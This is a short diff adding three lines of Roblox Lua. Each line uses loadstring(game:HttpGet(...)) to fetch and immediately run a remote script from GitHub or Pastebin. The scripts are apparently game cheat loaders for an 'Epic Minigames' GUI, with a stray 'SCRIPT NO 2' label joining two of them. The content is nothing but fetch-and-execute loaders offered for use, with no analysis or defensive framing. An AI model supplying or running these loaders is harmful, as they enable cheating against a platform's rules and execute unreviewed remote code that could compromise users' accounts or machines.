@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()  SCRIPT NO 2  loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/epic/main/epic"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))();
